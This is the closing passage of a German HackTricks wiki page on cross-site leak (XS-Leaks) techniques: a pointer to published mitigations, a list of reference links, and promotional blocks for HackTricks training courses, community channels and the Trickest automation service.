Es gibt empfohlene Ma√ünahmen in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) sowie in jedem Abschnitt des Wikis [https://xsleaks.dev/](https://xsleaks.dev/). Schauen Sie dort nach weiteren Informationen, wie Sie sich gegen diese Techniken sch√ºtzen k√∂nnen.

## Referenzen

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
